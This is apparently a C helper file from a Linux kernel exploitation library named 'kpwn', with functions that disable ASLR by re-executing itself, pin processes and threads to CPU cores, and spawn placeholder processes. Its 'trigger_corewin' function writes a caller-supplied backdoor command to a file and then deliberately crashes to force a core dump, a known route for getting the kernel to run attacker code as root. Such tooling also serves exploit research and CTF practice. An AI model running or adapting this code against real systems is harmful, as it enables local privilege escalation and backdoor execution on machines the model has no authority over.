#define _GNU_SOURCE

#include <fcntl.h>
#include <kpwn/flow.h>
#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <pthread.h>
#include <sched.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include <unistd.h>

void noaslr(int argc, char *argv[]) {
  ASSERT(1 <= argc);

  if (personality(ADDR_NO_RANDOMIZE) & ADDR_NO_RANDOMIZE) {
    log_success("killed aslr");
    return;
  }

  argv[0] = "/proc/self/exe";

  SYSCHK(execve(argv[0], argv, NULL));
}

void process_assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  SYSCHK(
      sched_setaffinity(getpid(), sizeof(cpuset), &cpuset));

  log_success("assigned to core %d", core_id);
}

void thread_assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  SYSCHK(pthread_setaffinity_np(pthread_self(),
                                sizeof(cpuset), &cpuset));

  log_success("Thread assigned to core %d", core_id);
}

void trigger_corewin(const char *backdoor_file,
                     const char *backdoor_cmd) {
  if (!SYSCHK(fork())) {
    log_info("spawned backdoor process");
    int fd =
        SYSCHK(open(backdoor_file, O_RDWR | O_CREAT, 0775));
    SYSCHK(
        write(fd, backdoor_cmd, strlen(backdoor_cmd) + 1));
    close(fd);

    log_info("core dumping...");
    *(volatile uint8_t *)0 = 0;

    log_error("could not send SEGV signal");
    exit(-1);
  }
  pause();
}

void set_process_name(char *name) {
  SYSCHK(prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0));
}

void init_billy() {
  if (SYSCHK(fork()) == 0) {
    log_info("spawned billy");

    set_process_name("billy");
    pause();
  }
}
